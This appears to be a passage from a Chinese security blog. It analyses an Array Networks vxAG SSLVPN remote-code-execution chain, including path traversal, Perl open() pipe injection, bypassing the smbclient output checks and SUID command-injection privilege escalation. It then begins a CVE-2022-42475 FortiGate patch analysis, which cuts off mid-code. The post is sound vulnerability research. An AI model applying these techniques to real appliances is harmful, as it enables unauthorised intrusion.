<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">displayInfo</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($page, $kvars, $title, $message, $caller_name, $caller_href) = @_;</span><br><span class="line">	<span class="keyword">my</span> $charset = &amp;localization::msg(<span class="string">&#x27;charset&#x27;</span>) || <span class="string">&#x27;UTF-8&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (&amp;is_login_failure($message)) &#123;</span><br><span class="line">		<span class="keyword">print</span> $page-&gt;header(<span class="string">-type =&gt;</span> <span class="string">&quot;text/html; charset=<span class="subst">$&#123;charset&#125;</span>&quot;</span>, <span class="string">-status =&gt;</span> <span class="string">&quot;401 Access Denied&quot;</span>, <span class="string">-WWW_Authenticate =&gt;</span> <span class="string">&quot;_AN_fshare&quot;</span> );</span><br><span class="line">	&#125; <span class="keyword">elsif</span> ($message =~ <span class="regexp">m/^FATAL_ERROR_/</span>) &#123;</span><br><span class="line">		$message =~ <span class="regexp">s/^FATAL_ERROR_//</span>;</span><br><span class="line">		$message =~ <span class="regexp">s/\sat\s.*//</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">print</span> $page-&gt;header(<span class="string">-type =&gt;</span> <span class="string">&quot;text/html; charset=<span class="subst">$&#123;charset&#125;</span>&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">my</span> %html_data = &amp;read_template(<span class="keyword">hex</span>($kvars-&gt;&#123;<span class="string">&#x27;flags&#x27;</span>&#125;), $kvars-&gt;&#123;<span class="string">&#x27;change_url&#x27;</span>&#125;,</span><br><span class="line">	                               $title, $kvars-&gt;&#123;<span class="string">&#x27;fshare_template&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">my</span> $top_html = $html_data&#123;<span class="string">&#x27;top_html&#x27;</span>&#125;;</span><br><span class="line">	<span class="keyword">my</span> $end_html = $html_data&#123;<span class="string">&#x27;end_html&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($top_html eq <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">		&amp;last_ditch_error($page, &amp;localization::msg(<span class="number">1</span>)); <span class="comment">#liu</span></span><br><span class="line">		<span class="keyword">exit</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">my</span> $message_html = &amp;generate_info($title, $message, $caller_name,</span><br><span class="line">	                                  $caller_href);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">print</span> $top_html;</span><br><span class="line">	<span class="keyword">print</span> $message_html;</span><br><span class="line">	<span class="keyword">print</span> $end_html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>代码会使用 is_login_failure 函数鉴权，无论是否通过，后面都会调用 read_template 函数尝试读取一个 HTML 模板文件，这个函数的参数是用户可控的。</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">read_template</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($flags, $reset_pwd_url, $title, $ai_template) = @_;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">my</span> $template = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">my</span> $top_html = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">my</span> $end_html = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">my</span> %html_data = (<span class="string">&#x27;top_html&#x27;</span> =&gt; <span class="string">&quot;&quot;</span>, <span class="string">&#x27;end_html&#x27;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($ai_template) &#123;</span><br><span class="line">		$ai_template = <span class="string">&quot;/ca/fileshare/htdocs/&quot;</span> . $ai_template;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">open</span>(TEMPLATE, <span class="string">&quot;&lt;$ai_template&quot;</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> %html_data;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment"># ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们看到代码会使用第四个参数即 fshare_template 拼接一个路径，然后打开对应的文件读取并使用其中内容，期间缺少对数据的过滤，通过构造路径穿越 payload 可以读取一些敏感文件。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_15.png"
                     
                ></p>
<p>类似的“小问题”还有很多，限于篇幅我们只介绍其中一个。除这些小问题之外，我们希望有一种办法能实现远程代码执行。</p>
<p>参考<a class="link"   href="https://www.mi1k7ea.com/2020/11/24/Perl%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" >perl 代码审计<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>文章，在 perl 中除常规的 system、exec 之外，open 函数也可以执行系统命令，只需要在路径的最后添加一个 <code>|</code> 字符。在设备的 perl 代码库中查询相关风险点，似乎只有 open 有利用机会。</p>
<p>查找引用 open 函数的位置，发现名为 printFile 的函数</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">printFile</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">my</span> $charset = &amp;localization::msg(<span class="string">&#x27;charset&#x27;</span>) || <span class="string">&#x27;UTF-8&#x27;</span>;</span><br><span class="line">	<span class="keyword">my</span> ($fullname, $type) = @_;</span><br><span class="line">	<span class="keyword">my</span> $fh = FileHandle-&gt;new();</span><br><span class="line">	<span class="keyword">my</span> $filename = basename($fullname);</span><br><span class="line">	<span class="keyword">my</span> $error = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">my</span> $buf = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (! <span class="keyword">open</span>($fh, <span class="string">&quot;$fullname&quot;</span>)) &#123;</span><br><span class="line">		$error = &amp;localization::msg(<span class="number">26</span>);</span><br><span class="line">		<span class="keyword">return</span> $error;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$contenttype = noRewriteContentType($filename);</span><br><span class="line">	<span class="keyword">if</span> ($contenttype eq <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (-T <span class="string">&quot;$fullname&quot;</span>) &#123;</span><br><span class="line">			$contenttype = <span class="string">&quot;text/plain&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			$contenttype = <span class="string">&quot;application/octet_stream&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($type eq <span class="string">&quot;SMB&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span> ($filename =~ <span class="regexp">/:([0-9a-f][0-9a-f])/</span>) &#123;</span><br><span class="line">			$sjisbyte = <span class="keyword">hex</span>($1);</span><br><span class="line">			$sjisbyte = <span class="keyword">pack</span>(<span class="string">&quot;C&quot;</span>, $sjisbyte);</span><br><span class="line">			$filename =~ <span class="regexp">s/:[0-9a-f][0-9a-f]/$sjisbyte/</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">print</span>	<span class="string">&quot;Content-Type:<span class="subst">$&#123;contenttype&#125;</span>;charset=<span class="subst">$&#123;charset&#125;</span>\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># set binary mode</span></span><br><span class="line">	<span class="keyword">binmode</span> STDOUT;</span><br><span class="line">	<span class="keyword">while</span>(<span class="keyword">read</span>($fh, $buf, <span class="number">8192</span>)) &#123; <span class="keyword">print</span> $buf; &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">close</span>($fh);</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>第 10 行调用了 open 函数去打开外部传递的参数 $fullname，查看使用 printFile 的位置可以定位到位于 cifs 文件中的 downloadSmbFile 函数。</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">downloadSmbFile</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($p, $kvars, $h_ip) = @_;</span><br><span class="line">	<span class="keyword">my</span> $uname = $kvars-&gt;&#123;<span class="string">&#x27;uname&#x27;</span>&#125;;</span><br><span class="line">	<span class="keyword">my</span> $password = $kvars-&gt;&#123;<span class="string">&#x27;password&#x27;</span>&#125;;</span><br><span class="line">	<span class="keyword">my</span> $workgroup = fileshare::get_workgroup($p, $kvars);</span><br><span class="line">	<span class="keyword">my</span> $path = $p-&gt;url_param(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">	<span class="keyword">my</span> $service = $p-&gt;url_param(<span class="string">&#x27;service&#x27;</span>);</span><br><span class="line">	<span class="keyword">my</span> $contenttype = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">my</span> $error = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">my</span> $file = basename($path);</span><br><span class="line">	<span class="keyword">my</span> $dir = dirname($path);</span><br><span class="line"></span><br><span class="line">	$tmpdir = <span class="string">`mktemp -d /tmp/tempfsXXXXXX`</span>;</span><br><span class="line">	<span class="keyword">chomp</span> $tmpdir;</span><br><span class="line">	&amp;secure_common::secureBackticks(<span class="string">&quot;/bin/chmod&quot;</span>, <span class="string">&quot;777&quot;</span>, $tmpdir);</span><br><span class="line">	<span class="keyword">if</span> ($? !=<span class="number">0</span>) &#123;</span><br><span class="line">		$error = &amp;localization::msg(<span class="number">3</span>);</span><br><span class="line">		<span class="keyword">goto</span> DOWNLOADSMBFILE_END;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@service = &amp;cifs_common::parseSmbService($service);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">my</span> $service_name = $service[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">my</span> $service_options = $service[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment"># handle DFS share</span></span><br><span class="line">	<span class="keyword">my</span> $loop_counter = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">my</span> $smbshare = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> ($loop_counter &lt; $dfs_common::MAX_DFS_HOPS) &#123;    <span class="comment"># max = 8</span></span><br><span class="line">		$loop_counter++;</span><br><span class="line"></span><br><span class="line">		$smbshare = &amp;secure_common::secureBackticks(<span class="string">&#x27;/ca/fileshare/samba/bin/smbclient&#x27;</span>,</span><br><span class="line">			<span class="string">&quot;$service_name&quot;</span>,</span><br><span class="line">			<span class="string">&quot;$password&quot;</span>,</span><br><span class="line">			<span class="string">&#x27;-U&#x27;</span>, <span class="string">&quot;$uname&quot;</span>,</span><br><span class="line">			<span class="string">&#x27;-W&#x27;</span>, <span class="string">&quot;$workgroup&quot;</span>,</span><br><span class="line">			<span class="string">&#x27;-c&#x27;</span>, <span class="string">&quot;AfterLogOnCmd;cd \&quot;$dir\&quot;;AfterCdCmd;get \&quot;$file\&quot; \&quot;$tmpdir/$file\&quot;;AfterGetCmd&quot;</span>,</span><br><span class="line">			<span class="string">&quot;$service_options&quot;</span>);</span><br><span class="line"></span><br><span class="line">		$error = &amp;cifs_common::getSmbConnInfo($smbshare);</span><br><span class="line">		<span class="keyword">if</span> ($error <span class="keyword">ne</span> <span class="string">&quot;Success&quot;</span>) &#123;</span><br><span class="line">			$error = &amp;cifs_common::printSmbConnError($error);    <span class="comment"># 获取文件失败</span></span><br><span class="line">			<span class="keyword">goto</span> DOWNLOADSMBFILE_END;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$error = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$error = &amp;cifs_common::getSmbCmdInfo($smbshare,</span><br><span class="line">						<span class="string">&quot;AfterLogOnCmd: command not found&quot;</span>,</span><br><span class="line">						<span class="string">&quot;AfterCdCmd: command not found&quot;</span>);</span><br><span class="line">		<span class="comment"># check for DFS share</span></span><br><span class="line">		<span class="keyword">my</span> $check_dfs = &amp;dfs_common::smbDfsError($error);</span><br><span class="line">		<span class="keyword">if</span> ($check_dfs <span class="keyword">ne</span> <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">			($service_name, $dir, $h_ip) =</span><br><span class="line">				&amp;dfs_common::smbDfsReferral($smbshare, $service_name, $dir,</span><br><span class="line">								$h_ip, $kvars-&gt;&#123;<span class="string">&#x27;site_id&#x27;</span>&#125;);</span><br><span class="line">			<span class="keyword">next</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">last</span>;</span><br><span class="line">	&#125; <span class="comment"># end while loop</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($error <span class="keyword">ne</span> <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">		$error = &amp;localization::msg(<span class="number">115</span>,$dir);    <span class="comment"># Cannot change directory to $_ANs</span></span><br><span class="line">		<span class="keyword">goto</span> DOWNLOADSMBFILE_END;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	$error = &amp;cifs_common::getSmbCmdInfo($smbshare, <span class="string">&quot;AfterCdCmd: command not found&quot;</span>, <span class="string">&quot;AfterGetCmd: command not found&quot;</span>);</span><br><span class="line">	$error = parseSmbGetResult($error);</span><br><span class="line">	<span class="keyword">if</span> ($error <span class="keyword">ne</span> <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( $error eq <span class="string">&quot;NT_STATUS_ACCESS_DENIED&quot;</span> ) &#123;</span><br><span class="line">			$error = &amp;localization::msg(<span class="number">116</span>, $file);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			$error = &amp;localization::msg(<span class="number">117</span>, $file);</span><br><span class="line">		&#125;</span><br><span class="line">		&amp;fastlog::perl_fastlog(fastlog::LOG_NOTICE, $fastlog_method, $fastlog_code_permission_fail, $fastlog_msg_permission_fail, \%fastlog_optional);</span><br><span class="line">		<span class="keyword">goto</span> DOWNLOADSMBFILE_END;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($error eq <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">		$error = &amp;fileshare::printFile(<span class="string">&quot;$tmpdir/$file&quot;</span>, <span class="string">&quot;SMB&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($error eq <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">		$fastlog_optional&#123;<span class="string">&#x27;rcvd&#x27;</span>&#125; = (<span class="keyword">stat</span> <span class="string">&quot;$tmpdir/$file&quot;</span>)[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">		&amp;fastlog::perl_fastlog(fastlog::LOG_INFO, $fastlog_method,</span><br><span class="line">							   $fastlog_code_success, $fastlog_msg_success,</span><br><span class="line">							   \%fastlog_optional);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DOWNLOADSMBFILE_END:</span><br><span class="line"></span><br><span class="line">	&amp;secure_common::secureBackticks(<span class="string">&quot;rm&quot;</span>, <span class="string">&quot;-rf&quot;</span>, $tmpdir);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($error <span class="keyword">ne</span> <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">		&amp;fileshare::displayInfo($p, $kvars, &amp;localization::msg(<span class="number">26</span>), $error,</span><br><span class="line">		                        <span class="keyword">undef</span>, <span class="keyword">undef</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>简单来说，这个函数负责从远程 SMB 服务器上下载文件到本地，用户可以提供服务器的地址、文件路径、用户名和密码等参数，最后代码会调用 secureBackticks 函数以数组方式执行 smbclient 程序，完成下载文件操作。这里可以控制 smbclient 的各项参数，但是并不能直接获取 shell。</p>
<p>在调用 printFile 函数的位置会用 $tmpdir 和 $file 两个参数拼接一个路径，其中 $file 参数即 $path 是用户可控的。看起来只需要控制 $path 参数即可实现命令执行，但是仔细观察代码逻辑发现并没有这么简单。只有当 $error 为空，即从 smb 服务器取回文件时没有出错才能执行 printFile 函数。</p>
<p>最初我想到先在远程服务器上搭建一个 SMB 服务器，在服务器中放一个文件名带有 <code>|</code> 字符的文件，然后正常构造各个参数让 smbclient 取回这个文件，不过 SMB 服务不能支持文件名带有 <code>|</code> 的文件。</p>
<p>例如以下测试：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_16.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_17.png"
                     
                ></p>
<p>这个包含非法字符的文件会被自动重命名。</p>
<p>那么这个位置就无法利用了吗？我们仔细观察代码逻辑，在判断命令是否执行成功时调用了函数 getSmbConnInfo 以及 getSmbCmdInfo</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">getSmbConnInfo</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($output) = @_;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($output =~ <span class="regexp">/AfterLogOnCmd: command not found/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($output =~ <span class="regexp">/STATUS_DUPLICATE_NAME/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;NT_STATUS_DUPLICATE_NAME&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	@output = <span class="keyword">split</span>(<span class="string">&quot; &quot;</span>, $output);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $output[<span class="keyword">scalar</span>(@output)-<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">getSmbCmdInfo</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($output, $delimiter1, $delimiter2) = @_;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (! $output =~ <span class="regexp">/^$delimiter1$/m</span> ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Error&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (! $output =~ <span class="regexp">/^$delimiter2$/m</span> ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Error&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@output = <span class="keyword">split</span>(<span class="regexp">/^$delimiter1$/m</span>, $output);</span><br><span class="line">	@output = <span class="keyword">split</span>(<span class="regexp">/^$delimiter2$/m</span>, $output[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	$output = $output[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">	$output =~ <span class="regexp">s/^\s+//</span>;</span><br><span class="line">	$output =~ <span class="regexp">s/\s+$//</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这些函数尝试在命令的输出中匹配一些字符串，如果匹配成功则返回成功。</p>
<p>首先按照代码中的命令构造一条，在设备的终端执行：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_18.png"
                     
                ></p>
<p>随意构造的服务器地址导致返回无法连接错误信息。我们看到 smbclient 带有一个 -M 选项，尝试添加此选项：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_19.png"
                     
                ></p>
<p>添加选项之后打印了我们控制的信息。合理利用各个参数来排布这些错误信息，结合代码判断命令成功的方式，就可以绕过这些判断函数，从而执行到 printFile。这样 path 参数就完全可控，不受非法字符限制，我们只需要构造命令注入 payload，并在其末尾添加一个 <code>|</code> 字符即可实现代码执行。</p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>通过上面的命令执行只能以 nobody 权限执行命令，需要考虑如何提权。</p>
<p>提权首先要考虑使用系统中自带的，具有 SUID 权限的二进制程序，通过筛选此类文件，可以找到一个名为 webui_localdb_file 的程序。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  seteuid(<span class="number">0</span>);</span><br><span class="line">  setegid(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( *argv[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">      <span class="built_in">snprintf</span>(cmd_str, <span class="number">0x400</span>uLL, <span class="string">&quot;cp %s/%s %s/%s&quot;</span>, <span class="string">&quot;/tmp&quot;</span>, argv[<span class="number">2</span>], <span class="string">&quot;/ca/fileshare/htdocs/client_sec/l3vpn&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">      <span class="built_in">snprintf</span>(path_str, <span class="number">0x200</span>uLL, <span class="string">&quot;/ca/conf/uconf/%s&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">      <span class="keyword">if</span> ( lstat(path_str, &amp;sb) == <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(cmd_str, <span class="number">0x400</span>uLL, <span class="string">&quot;mkdir -p -v -m 755 /%s&quot;</span>, path_str);</span><br><span class="line">        system(cmd_str);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memset</span>(cmd_str, <span class="number">0</span>, <span class="keyword">sizeof</span>(cmd_str));</span><br><span class="line">      <span class="built_in">snprintf</span>(cmd_str, <span class="number">0x400</span>uLL, <span class="string">&quot;cp %s/%s %s/%s&quot;</span>, <span class="string">&quot;/tmp&quot;</span>, argv[<span class="number">3</span>], path_str, argv[<span class="number">3</span>]);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>我们看到程序首先调用 seteuid 和 setegid 设置权限到 root，然后根据外部传入的参数执行各种命令，显然存在命令注入，利用此程序即可实现权限提升。</p>
<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>请观看下面的演示视频：</p>
<p><video controls height='100%' width='100%' src="/img/array_vxag2_01.mp4"></video></p>
<p>本文介绍了关于 ArrayNetworks vxAG 设备 License 破解和 SSLVPN 远程代码执行的相关内容，文中还有一些细节需要解决，另外在新版中 webui_localdb_file 对输入的参数进行了过滤。如何在新版中实现提权？如何解决代码执行中的一些小问题？我们就留给读者去探索吧。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2022-42475</title>
    <url>/2022/12/15/CVE-2022-42475/</url>
    <content><![CDATA[<p>2022 年 12 月 12 日，Fortinet 官方发布了影响 FortiGate SSLVPN 的 RCE 漏洞 CVE-2022-42475 相关信息。官方公告显示该漏洞已经被发现在野利用，建议所有用户尽快升级。本文对此漏洞的成因进行分析。</p>
<span id="more"></span>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>Fortinet 官方对 Fortigate 等设备的虚拟机版本开放下载，下载链接：<a class="link"   href="https://support.fortinet.com/Download/VMImages.aspx" >https://support.fortinet.com/Download/VMImages.aspx<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>下载到虚拟机镜像后导入 vmware 安装，第一次启动先配置网络</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用默认用户 admin:空密码 登录到 CLI</span><br><span class="line"></span><br><span class="line">config system interface</span><br><span class="line">edit port1</span><br><span class="line">set mode static</span><br><span class="line">set ip 192.168.x.x/255.255.255.0</span><br><span class="line">end</span><br></pre></td></tr></table></figure></div>

<p>配置好网络后通过浏览器访问到设备 web 界面，首次登录系统会要求导入 license。这里有两种选择，一是完整 license，二是试用版。我们选择试用版 license，先去官方网站注册一个 FortiCloud 账号，然后在系统上登录，等待重启即可。(也可以参考<a href="https://wzt.ac.cn/2023/03/02/fortios_padding/">文章</a>尝试破解 License 授权)</p>
<p><strong>注意！如果选择使用评估版本 License，设备会进入 LENC 模式，在该模式下不能使用高级加密算法，相应的，只能使用 SSLv3 或 TLSv1.0 等过时的加密链接。此时可能会遇到 SSL_VERSION_OR_CIPHER_MISMATCH 等错误。</strong></p>
<p>漏洞位于设备的 SSLVPN 功能中，分析前需要配置 VPN 功能。配置过程可参考官方文档，简单来说，首先在 User &amp; Authentication -&gt; User Definition 功能中创建一些 VPN 账户，添加到同一个 group 中。然后在 VPN -&gt; SSL-VPN Settings 中填写监听网卡和端口等信息。最后按照提示创建一条防火墙规则允许外部请求进入。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-1.png"
                     
                ></p>
<p>这样访问对应接口即可看到 SSLVPN 界面。</p>
<h2 id="代码和权限获取"><a href="#代码和权限获取" class="headerlink" title="代码和权限获取"></a>代码和权限获取</h2><p>我们采用挂载磁盘的方法，关闭虚拟机，将较小的磁盘卸载并挂载到另一台 Linux 系统上，开机之后看到系统识别到一些硬盘分区：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-2.png"
                     
                ></p>
<p>在 FORTIOS 分区中的 rootfs.gz 是主要文件系统，将其解压得到一些系统文件，但 bin 等目录下没有任何内容。我们参考网络上的文章发现关键文件在 bin.tar.xz、migadmin.tar.xz 等压缩包内，这些压缩档案使用 Fortinet 自己修改过的工具打包。具体解包方法，在解压目录下执行命令</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chroot</span> . /sbin/xz --check=sha256 -d /bin.tar.xz</span><br><span class="line">sudo <span class="built_in">chroot</span> . /sbin/ftar -xf /bin.tar</span><br><span class="line">sudo <span class="built_in">chroot</span> . /sbin/xz --check=sha256 -d /migadmin.tar.xz</span><br><span class="line">sudo <span class="built_in">chroot</span> . /sbin/ftar -xf /migadmin.tar</span><br></pre></td></tr></table></figure></div>

<p>解包之后找到 &#x2F;bin&#x2F;init，系统中的大部分业务程序都软链接到该二进制文件，是我们主要的分析目标。</p>
<p>按照相同的方法提取出 7.2.2 和 7.2.3 中的 init 文件，准备进行补丁分析。</p>
<p>权限获取可参考网络文章。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先进行补丁对比，将不同版本的 init 程序导入 IDA 分析，保存 idb 之后用 bindiff 比较，需要注意一点，直接使用 bindiff GUI 可能会卡在解包 idb 阶段，建议使用 IDA 中的 bindiff 插件比对，程序较大需要分析较长时间。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-3.png"
                     
                ></p>
<p>比较完成后按照相似度和置信度逐个分析代码差异，新版本对 wad 部分进行了很多修改，除此之外比较明显的修改位于内存分配函数中。</p>
<p>举例来说，7.2.2 版本中某内存分配函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1776C70</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line"></span><br><span class="line">  v4 = je_malloc();</span><br><span class="line">  v5 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_16CFB00(<span class="number">0</span>, <span class="number">8</span>, <span class="string">&quot;malloc(%ld) calling from %s:%d failed.\n&quot;</span>, a1, a2, a3);</span><br><span class="line">    <span class="keyword">return</span> v5;</span><br><span class="line">  &#125;</span><br><span class="line">  ++qword_A8AC610;</span><br><span 